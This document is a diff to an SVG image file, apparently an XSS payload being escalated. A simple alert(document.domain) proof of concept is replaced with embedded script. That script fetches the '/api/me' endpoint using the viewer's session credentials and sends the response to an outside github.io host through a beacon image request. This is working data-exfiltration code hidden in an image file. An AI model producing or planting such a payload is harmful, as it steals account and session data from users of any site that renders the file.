@@ -1,1 +1,14 @@
-<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><text x="10" y="20">pwn</text></svg>
+<svg xmlns="http://www.w3.org/2000/svg" width="640" height="120">
+  <script type="text/javascript"><![CDATA[
+  try {
+    fetch('/api/me', {credentials:'include'})
+      .then(function (r) { return r.text(); })
+      .then(function (d) {
+        document.getElementById('out').textContent = 'UID/DATA: ' + d.substring(0, 400);
+        new Image().src = 'https://mkwolfx.github.io/beacon.gif?d=' + encodeURIComponent('api.me=' + d.substring(0, 400));
+      })
+      .catch(function (e) { document.getElementById('out').textContent = 'err ' + e.message; });
+  } catch (e) { document.getElementById('out').textContent = 'boo ' + e.message; }
+  ]]></script>
+  <text id="out" x="5" y="20" font-size="14" fill="black">loading session...</text>
+</svg>
